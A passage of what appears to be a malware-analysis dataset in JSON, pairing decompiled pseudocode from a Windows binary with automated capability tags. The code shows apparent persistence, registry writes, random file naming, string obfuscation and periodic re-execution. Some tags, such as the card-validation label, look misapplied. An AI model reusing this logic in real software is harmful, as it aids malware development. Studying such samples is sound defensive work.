        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00407efb(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_834h;\n    uint var_830h;\n    uint var_82ch;\n    uint32_t var_828h;\n    uint var_824h;\n    uint var_820h;\n    uint var_81ch;\n    uint var_818h;\n    uint var_813h;\n    int32_t var_714h;\n    int32_t var_70dh;\n    uint32_t var_708h;\n    uint var_704h;\n    uint var_304h;\n    uchar uStack772;\n    uchar auStack771 [507];\n    uint var_104h;\n    \ncode_r0x00407f12:\n    func_0x00409548(&var_813h, 0x42b272);\n    iVar1 = func_0x004099e8();\n    var_70dh._0_1_ = iVar1 % 0xf;\n    if (var_70dh == '\\x01') {\n        func_0x00409548(&var_813h, 0x42b2ac);\n    }\n    if (var_70dh == '\\x02') {\n        func_0x00409548(&var_813h, 0x42b2c6);\n    }\n    if (var_70dh == '\\x03') {\n        func_0x00409548(&var_813h, 0x42b2e7);\n    }\n    if (var_70dh == '\\x04') {\n        func_0x00409548(&var_813h, 0x42b301);\n    }\n    if (var_70dh == '\\x05') {\n        func_0x00409548(&var_813h, 0x42b319);\n    }\n    if (var_70dh == '\\x06') {\n        func_0x00409548(&var_813h, 0x42b334);\n    }\n    if (var_70dh == '\\a') {\n        func_0x00409548(&var_813h, 0x42b34f);\n    }\n    if (var_70dh == '\\b') {\n        func_0x00409548(&var_813h, 0x42b36c);\n    }\n    if (var_70dh == '\\t') {\n        func_0x00409548(&var_813h, 0x42b38b);\n    }\n    if (var_70dh == '\\n') {\n        func_0x00409548(&var_813h, 0x42b3aa);\n    }\n    if (var_70dh == '\\v') {\n        func_0x00409548(&var_813h, 0x42b3c9);\n    }\n    if (var_70dh == '\\f') {\n        func_0x00409548(&var_813h, 0x42b3e8);\n    }\n    if (var_70dh == '\\r') {\n        func_0x00409548(&var_813h, 0x42b403);\n    }\n    if (var_70dh == '\\x0e') {\n        func_0x00409548(&var_813h, 0x42b420);\n    }\n    fcn.00406de6(&var_813h, 0x42a070);\n    iVar1 = fcn.00406de6(0x42b28f, 0x42a070);\n    if ((var_70dh == '2') || (iVar1 != 0)) {\n        iVar1 = 0;\n        var_714h = fcn.0040441a(0x42a070, 0);\n        if (var_714h != 0) {\ncode_r0x00408423:\n            do {\n                iVar1 = fcn.004051d6(var_714h, iVar1, &var_304h);\n                if (iVar1 == 0) goto code_r0x00408443;\n                if (var_304h != '\\0') {\n                    if ((var_304h == ':') && (var_304h._3_1_ == ':')) {\n                        var_304h._3_1_ = '\\0';\n                        func_0x00409a18(&var_304h, 0x42d935, &var_708h);\n                        if ((var_708h != 0) && (iVar2 = func_0x004099e8(),  var_708h < iVar2 / 0x14e + 1U))\n                        goto code_r0x00408423;\n                        if (*0x419d60 == 2) {\n                            func_0x00409a00(&var_104h, 0x42d92a, 0x42a190);\n                            func_0x00409a00(&var_704h, 0x42d91f, 0x42a190);\n                        }\n                        else {\n                            func_0x00409640(&var_704h, 0x400);\n                            func_0x00409a00(&var_104h, 0x42d910, &var_704h);\n                            func_0x00409a24(&var_704h, 0x42d903);\n                        }\n                        func_0x00409778(&var_104h);\n                        func_0x00409a00(&var_704h, 0x42d8fa, &var_704h, &uStack772);\n                        func_0x0040973c(&var_704h, 0);\n                    }\n                    iVar2 = fcn.0040203b(&var_304h, 0x42d8f4, 1);\n                    if ((iVar2 == 0) && (var_708h = func_0x004099a0(auStack771),  10 < var_708h)) {\n                        func_0x00409a00(&var_704h, 0x42d8e5, 0x42a190, var_708h);\n                        func_0x00409548(&var_104h, 0x42b28f);\n                        for (var_828h = func_0x00409754(&var_104h); 3 < var_828h; var_828h = var_828h - 1) {\n                            if (*(&var_104h + var_828h) == '/') {\n                                *(&var_104h + var_828h) = 0;\n                                break;\n                            }\n                        }\n                        func_0x00409a00(&var_104h, 0x42d8d6, &var_104h, var_708h);\n                        iVar2 = func_0x00409754(&var_704h);\n                        iVar3 = func_0x00409754(&var_104h);\n                        *NULL = func_0x00409694(0x40, iVar2 + 0x10 + iVar3);\n                        func_0x00409548(*NULL, &var_704h);\n                        iVar2 = func_0x00409754(&var_704h);\n                        func_0x00409548(stack0xfffff8f0 + 1 + iVar2, &var_104h);\n                        uVar4 = func_0x0040976c(0, 0, 0x4072be, stack0xfffff8f0, 0, &var_708h);\n                        func_0x004095ec(uVar4);\n                    }\n                }\n            } while( true );\n        }\n    }\n    goto code_r0x0040844e;\ncode_r0x00408443:\n    func_0x004096a0(var_714h);\ncode_r0x0040844e:\n    func_0x00409988(1800000);\n    goto code_r0x00407f12;\n}\n",
        "token_count": 1766
    },
    "0040846b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040846b(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    ushort *puVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint var_135dh;\n    uint var_1259h;\n    code *var_1254h;\n    uint var_1250h;\n    uint32_t var_124ch;\n    uint var_1248h;\n    uint var_1242h;\n    uint var_121eh;\n    uint var_11d8h;\n    uint var_119eh;\n    int32_t var_115ch;\n    uint var_1158h;\n    uint var_1154h;\n    uint var_114fh;\n    uint var_104bh;\n    uint uStackY376;\n    uint *puStackY372;\n    uint *puStackY368;\n    uint uStackY364;\n    uint uStackY360;\n    uint uStackY356;\n    uint *puStackY352;\n    uint uStackY348;\n    uint uStackY344;\n    uint uStackY340;\n    uint uStackY336;\n    uint uStackY332;\n    uint uStackY328;\n    uint uStackY324;\n    uint uStackY320;\n    uint uStackY316;\n    uint *puStackY312;\n    uint uStackY308;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    func_0x00409528();\n    uStack20 = 0x42b094;\n    uStack24 = 0;\n    uStack28 = 0x1f0001;\n    var_1ch = 0x408497;\n    var_115ch = func_0x004096ac();\n    if (var_115ch != 0) {\n        var_1ch = var_115ch;\n        func_0x004095ec();\n        func_0x004099ac();\n    }\n    *0x419f34 = arg_8h;\n    *0x419d50 = 0x94;\n    var_1ch = 0x419d50;\n    func_0x00409634();\n    func_0x00409604();\n    func_0x0040961c();\n    func_0x00409a0c();\n    func_0x004095d4();\n    iVar2 = fcn.0040203b(&fcn.0040846b::var_114fh, 0x42a190, 1);\n    if (iVar2 == 0xffff) {\n        *0x42b474 = *0x42b474 + 8;\n        *0x42b474 = *0x42b474 * 2;\n        *0x42b474 = *0x42b474 + 1;\n        iVar2 = func_0x004099e8();\n        var_1259h._0_1_ = iVar2 / 2000 + 'A';\n        for (var_124ch = CONCAT13(1, var_124ch); var_124ch._3_1_ < 9;\n            var_124ch = var_124ch & 0xffffff | var_124ch._3_1_ + 1 << 0x18) {\n            iVar2 = func_0x004099e8();\n            *(&fcn.0040846b::var_1259h + (var_124ch >> 0x18)) = iVar2 / 2000 + 'a';\n        }\n        var_1254h = var_1254h & 0xffffff;\n        uVar3 = func_0x004099e8();\n        if ((uVar3 & 1) == 0) {\n            var_1254h._0_3_ = CONCAT12(0x32, CONCAT11(0x33, var_1254h._0_1_));\n            var_1254h = var_1254h & 0xff000000 | var_1254h;\n        }\n        func_0x00409a00();\n        func_0x00409658();\n        fcn.00404b30(&fcn.0040846b::var_135dh);\n        fcn.00404db0(&fcn.0040846b::var_1259h);\n        func_0x0040973c();\n        func_0x00409574();\n    }\n    func_0x00409a00();\n    puVar4 = 0x42d604;\n    puVar5 = &fcn.0040846b::var_119eh;\n    for (iVar2 = 0x21; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 2;\n    }\n    func_0x00409a00();\n    puVar4 = 0x42d646;\n    puVar5 = &fcn.0040846b::var_11d8h;\n    for (iVar2 = 0x1d; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 2;\n    }\n    func_0x00409a00();\n    puVar4 = 0x42d680;\n    puVar5 = &fcn.0040846b::var_121eh;\n    for (iVar2 = 0x23; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 2;\n    }\n    func_0x00409a00();\n    puVar5 = 0x42d6c6;\n    puVar6 = &fcn.0040846b::var_1242h;\n    for (iVar2 = 9; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    func_0x004096b8();\n    func_0x004096dc();\n    func_0x00409598();\n    iVar2 = -1;\n    do {\n        iVar1 = iVar2 + 1;\n        iVar2 = iVar2 + 1;\n    } while (*(&fcn.0040846b::var_104bh + iVar1) != '\\0');\n    func_0x00409748();\n    func_0x00409748();\n    func_0x00409910();\n    iVar2 = -1;\n    do {\n        iVar1 = iVar2 + 1;\n        iVar2 = iVar2 + 1;\n    } while (*(&fcn.0040846b::var_104bh + iVar1) != '\\0');\n    func_0x00409748();\n    func_0x00409748();\n    var_124ch = 0;\n    func_0x004095ec();\n    func_0x004097d8();\n    func_0x004097e4();\n    func_0x004098d4();\n    var_1250h = 0;\n    func_0x004097fc();\n    *0x419f00 = func_0x00409898();\n    func_0x004096e8();\n    fcn.00403bed(0);\n    uVar3 = func_0x00409628();\n    if (0x7fffffff < uVar3) {\n        func_0x004095e0();\n        var_1254h = func_0x004095f8();\n        func_0x004095a4();\n        (*var_1254h)();\n    }\n    var_1154h = 4;\n    uStackY308 = 0x408948;\n    fcn.00401fd6(0x80000001, 0x42b450, 0x42d879, 0x42b46c, &fcn.0040846b::var_1154h, &fcn.0040846b::var_1248h);\n    *0x42b46c = 1;\n    fcn.0040318a();\n    uStackY308 = 0x408984;\n    uStackY308 = func_0x0040976c();\n    puStackY312 = 0x40898a;\n    func_0x004095ec();\n    puStackY312 = &fcn.0040846b::var_1158h;\n    uStackY316 = 0;\n    uStackY320 = 0;\n    uStackY324 = 0x4072fb;\n    uStackY328 = 0;\n    uStackY332 = 0;\n    uStackY336 = 0x4089a3;\n    uStackY336 = func_0x0040976c();\n    uStackY340 = 0x4089a9;\n    func_0x004095ec();\n    uStackY340 = 0;\n    uStackY344 = 500;\n    uStackY348 = 1;\n    puStackY352 = *0x419f00;\n    uStackY356 = 0x4089bd;\n    func_0x004097f0();\n    while( true ) {\n        uStackY356 = 0;\n        uStackY360 = 0;\n        uStackY364 = 0;\n        puStackY368 = &fcn.0040846b::var_1ch;\n        puStackY372 = 0x4089e6;\n        iVar2 = func_0x00409814();\n        if (iVar2 == 0) break;\n        puStackY372 = &fcn.0040846b::var_1ch;\n        uStackY376 = 0x4089c8;\n        func_0x0040985c();\n        puStackY352 = &fcn.0040846b::var_1ch;\n        uStackY356 = 0x4089d7;\n        func_0x00409868();\n    }\n    return;\n}\n",
        "token_count": 2420
    },
    "004089f1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004041ba": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar __cdecl fcn.004041ba(char *arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uchar *puVar4;\n    uint *puVar5;\n    uint var_38h;\n    uint var_32h;\n    uint var_2bh;\n    uint var_1ch;\n    uint8_t var_bh;\n    uint8_t var_ah;\n    uint8_t var_9h;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = '\\x01';\n    puVar4 = 0x42bd74;\n    puVar5 = &var_1ch;\n    for (iVar2 = 0x11; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    puVar4 = 0x42bd85;\n    puVar5 = &var_2bh;\n    for (iVar2 = 0xf; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    puVar4 = 0x42bd94;\n    puVar5 = &var_32h;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    if (*arg_8h == 'g') {\n        arg_8h = arg_8h + 1;\n        var_1h._0_1_ = var_1h + '\\x01';\n    }\n    for (var_9h = 0; var_9h < 0x11; var_9h = var_9h + 1) {\n        if (*arg_8h == *(&var_1ch + var_9h)) {\n            var_1h._0_1_ = var_1h + '\\x04';\n            break;\n        }\n    }\n    for (var_ah = 0; var_ah < 0xf; var_ah = var_ah + 1) {\n        if (*arg_8h == *(&var_2bh + var_ah)) {\n            cVar1 = var_1h + '\\x01';\n            if (arg_8h[1] < 0xc0) {\n                if ((arg_8h[1] & 0xc0U) == 0x40) {\n                    cVar1 = var_1h + '\\x02';\n                }\n                var_1h._0_1_ = cVar1;\n                uVar3 = arg_8h[1] & 7;\n                if ((uVar3 == 4) || ((uVar3 == 5 && (arg_8h[1] < 0x40)))) {\n                    var_1h._0_1_ = var_1h + '\\x01';\n                }\n                if (((arg_8h[1] & 0xc0U) == 0) && ((arg_8h[1] & 7U) == 5)) {\n                    var_1h._0_1_ = var_1h + '\\x03';\n                }\n                cVar1 = var_1h;\n                if ((arg_8h[1] & 0xc0U) == 0x80) {\n                    cVar1 = var_1h + '\\x04';\n                }\n            }\n            var_1h._0_1_ = cVar1;\n            if ((*arg_8h == -9) && ((arg_8h[1] & 0x38U) == 0)) {\n                var_1h._0_1_ = var_1h + '\\x04';\n            }\n        }\n    }\n    var_bh = 0;\n    do {\n        if (6 < var_bh) {\ncode_r0x00404328:\n            if (*arg_8h == -0x7d) {\n                var_1h._0_1_ = var_1h + '\\x01';\n            }\n            return var_1h;\n        }\n        if (*arg_8h == *(&var_32h + var_bh)) {\n            var_1h._0_1_ = var_1h + '\\x01';\n            goto code_r0x00404328;\n        }\n        var_bh = var_bh + 1;\n    } while( true );\n}\n",
        "token_count": 1086
    },
    "00405eec": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00405eec(void)\n\n{\n    uint var_101h;\n    uint var_1h;\n    \n    for (var_1h._0_1_ = 0; var_1h < 5; var_1h._0_1_ = var_1h + 1) {\n        func_0x00409a00(&var_101h, 0x42dd8b, var_1h);\n        fcn.0040501b(0x80000001, &var_101h, 0x42dd86, 0);\n    }\n    fcn.0040501b(0x80000001, 0x42dd4a, 0x42dd38, 0);\n    fcn.00404fea(0x80000003, 0x42dceb, 0x42dcda, 0x42dcd6);\n    return 0;\n}\n",
        "token_count": 231
    },
    "004052a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004052a4(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    uVar1 = func_0x00409754(arg_8h);\n    uVar2 = func_0x00409694(0x40, uVar1 * 2 + 8);\n    for (uVar3 = 0; uVar3 < uVar1; uVar3 = uVar3 + 1) {\n        if (*(arg_8h + uVar3) != 'q') {\n            *(arg_8h + uVar3) = *(arg_8h + uVar3) ^ 0x71;\n        }\n    }\n    for (var_2h._0_2_ = 0; var_2h < uVar1; var_2h._0_2_ = var_2h + 1) {\n        func_0x00409a00(uVar2, 0x42df5a, uVar2, *(arg_8h + var_2h) / 0x1a + 0x61, *(arg_8h + var_2h) % 0x1a + 0x61);\n    }\n    return uVar2;\n}\n",
        "token_count": 342
    },
    "00404db0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00404db0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_205h;\n    uint var_101h;\n    uchar var_fbh;\n    uchar var_fah;\n    uint var_f9h;\n    uint var_1h;\n    \n    *0x42b474 = *0x42b474 + 0xaa;\n    iVar1 = func_0x004099e8();\n    var_101h._0_1_ = iVar1 / 2000 + 'A';\n    for (var_1h._0_1_ = 1; var_1h < 9; var_1h._0_1_ = var_1h + 1) {\n        iVar1 = func_0x004099e8();\n        *(&var_101h + var_1h) = iVar1 / 2000 + 'a';\n    }\n    var_f9h._0_1_ = 0;\n    uVar2 = func_0x004099e8();\n    if ((uVar2 & 1) == 0) {\n        var_fbh = 0x33;\n        var_fah = 0x32;\n    }\n    func_0x00409a00(&var_205h, 0x42dff5, 0x42a190, &var_101h);\n    var_20ch = func_0x004096b8(&var_205h, 0x40000000, 0, 0, 2, 0, 0);\n    func_0x00409a00(0x42ca88, arg_8h);\n    func_0x00409748(var_20ch, 0x42bdf8, 0x1801, &var_210h, 0);\n    func_0x004095ec(var_20ch);\n    *0x42b474 = *0x42b474 + 1;\n    func_0x00409a00(&var_101h, 0x42dfdd, 0x42dfff);\n    fcn.00404f6f(0x80000000, &var_101h, 0x42dfdc, &var_205h);\n    *0x42b474 = *0x42b474 + 1;\n    fcn.00404f6f(0x80000000, &var_101h, 0x42dfcd, 0x42dfc3);\n    fcn.00404f6f(0x80000002, 0x42df7d, 0x42df6c, 0x42dfff);\n    return;\n}\n",
        "token_count": 655
    },
    "00401e1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401e1f(void)\n\n{\n    uint in_FS_OFFSET;\n    uint var_18h;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar auStack20 [4];\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x42b01c;\n    uStack16 = 0x40109a;\n    *in_FS_OFFSET = &stack0xffffffec;\n    uStack52 = 0;\n    uStack56 = 0;\n    uStack60 = 0x42b028;\n    uStack64 = 0x42b024;\n    uStack68 = 0x42b020;\n    uStack72 = 0x401e67;\n    func_0x0040997c();\n    uStack72 = *0x42b028;\n    uStack76 = *0x42b024;\n    *0x42b014 = &stack0xffffffb0;\n    uStack80 = *0x42b020;\n    uStack60 = func_0x004094c4();\n    var_4h = 0;\n    uStack64 = 0x401e92;\n    func_0x004099ac();\n    return;\n}\n",
        "token_count": 322
    },
    "0040217c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040217c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    for (iVar2 = 0; iVar2 < arg_ch; iVar2 = iVar2 + 1) {\n        iVar1 = func_0x004099e8();\n        *(arg_8h + iVar2) = iVar1 / 2000 + 'a';\n    }\n    *(arg_8h + arg_ch) = 0;\n    return;\n}\n",
        "token_count": 127
    },
    "004021ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004021ce(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    for (iVar2 = 0; iVar2 < arg_ch; iVar2 = iVar2 + 1) {\n        iVar1 = func_0x004099e8();\n        *(arg_8h + iVar2) = iVar1 / 2000 + 'a';\n    }\n    *0x42b474 = *0x42b474 + 1;\n    *(arg_8h + arg_ch) = 0;\n    return;\n}\n",
        "token_count": 151
    },
    "00402238": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402238(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    *0x42b474 = *0x42b474 + 1;\n    iVar1 = arg_10h;\n    while( true ) {\n        if (arg_14h <= iVar1) {\n            return 0;\n        }\n        if (*(arg_8h + iVar1) != *(arg_ch + (iVar1 - arg_10h))) break;\n        iVar1 = iVar1 + 1;\n    }\n    return 1;\n}\n",
        "token_count": 153
    },
    "0040228e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040228e(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_10h;\n    uint var_4h;\n    \n    *0x42b474 = *0x42b474 + 1;\n    iVar1 = fcn.0040203b(arg_8h, 0x42e15e, arg_ch);\n    arg_10h = fcn.0040203b(arg_8h, 0x42e15e, arg_ch + 1);\n    fcn.004020e9(arg_8h, iVar1 + 1, arg_10h);\n    return;\n}\n",
        "token_count": 151
    },
    "004022dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004022dc(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = func_0x00409760(arg_8h);\n    func_0x00409730(0, 0, arg_8h, iVar1, arg_ch, 0x1fff, 0, 0);\n    *(arg_ch + iVar1) = 0;\n    return iVar1;\n}\n",
        "token_count": 104
    },
    "0040237c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040237c(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    func_0x0040947c(0);\n    iVar1 = func_0x00409470(0x42e110, &var_10h);\n    if (((-1 < iVar1) && (iVar1 = func_0x00409464(&var_10h, 0, 4, 0x42e1b0, arg_8h),  -1 < iVar1)) &&\n       (iVar1 = (****arg_8h)(*arg_8h, 0x42e1a0, arg_8h + 1),  -1 < iVar1)) {\n        return 1;\n    }\n    fcn.00402322(arg_8h);\n    return 0;\n}\n",
        "token_count": 242
    },
    "00403608": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403608(void)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    *0x42b474 = *0x42b474 + 1;\n    uVar1 = func_0x004095e0(0x42ba09);\n    *0x42a05c = func_0x004095f8(uVar1, 0x42ba13);\n    *0x419f10 = func_0x004095f8(uVar1, 0x42ba28);\n    *0x419df4 = func_0x004095f8(uVar1, 0x42ba3d);\n    *0x419f30 = func_0x004095f8(uVar1, 0x42ba4b);\n    *0x42a058 = func_0x004095f8(uVar1, 0x42ba5e);\n    return 0xc512ccc8;\n}\n",
        "token_count": 212
    },
    "0040368e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040368e(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x42b474 = *0x42b474 + 1;\n    (**0x42a05c)(&var_58h, 0x42ba84);\n    var_18h = 0x18;\n    var_14h = 0;\n    var_10h = &var_58h;\n    var_ch = 0x40;\n    var_8h = 0;\n    var_4h = 0;\n    var_30h = 0;\n    var_2ch = 0;\n    var_28h = 1;\n    var_24h = 1;\n    var_20h = 0x42ba74;\n    *0x42b474 = *0x42b474 + 2;\n    var_50h = 2;\n    var_4ch = 1;\n    var_48h = 0;\n    puVar2 = &var_30h;\n    puVar3 = &var_44h;\n    for (iVar1 = 5; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    (**0x419df4)(&var_1ch, 0x60000, &var_18h);\n    func_0x00409958(var_1ch, 6, 4, 0, 0, &var_5ch, 0, &var_64h);\n    func_0x00409970(1, &var_50h, var_5ch, &var_60h);\n    *0x42b474 = *0x42b474 + 1;\n    func_0x00409964(var_1ch, 6, 4, 0, 0, var_60h, 0);\n    func_0x004095ec(var_1ch);\n    *0x42b474 = *0x42b474 + 1;\n    (**0x419df4)(&var_1ch, var_50h, &var_18h);\n    return var_1ch;\n}\n",
        "token_count": 659
    },
    "004043a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004043a3(uint arg_8h, uint arg_ch)\n\n{\n    uchar auStackY8196 [8164];\n    uint uStackY32;\n    \n    func_0x00409528();\n    func_0x00409a48();\n    uStackY32 = 0x4043eb;\n    fcn.004043fa(&stack0xffffdffc);\n    return 0;\n}\n",
        "token_count": 93
    },
    "00404675": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404675(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_4h;\n    \n    func_0x004099d0(0x42e03b);\n    for (uVar1 = 0; uVar1 < arg_ch; uVar1 = uVar1 + 1) {\n        func_0x004099d0(0x42e035, *(arg_8h + uVar1));\n    }\n    func_0x004099d0(0x42e026);\n    return;\n}\n",
        "token_count": 135
    },
    "00404fea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404fea(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_18h;\n    \n    arg_18h = func_0x00409754(arg_14h);\n    fcn.00405046(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 1);\n    return;\n}\n",
        "token_count": 96
    },
    "0040501b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040501b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.00405046(arg_8h, arg_ch, arg_10h, &arg_14h, 4, 4);\n    return;\n}\n",
        "token_count": 70
    },
    "00405046": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405046(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = func_0x0040991c(arg_8h, arg_ch, 0, 0, 0, 0x20006, 0, &var_4h, &var_8h);\n    if (iVar1 == 0) {\n        iVar1 = func_0x0040994c(var_4h, arg_10h, 0, arg_1ch, arg_14h, arg_18h);\n        if (iVar1 == 0) {\n            func_0x00409928(var_4h);\n            uVar2 = 1;\n        }\n        else {\n            func_0x00409928(var_4h);\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 254
    },
    "004050b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
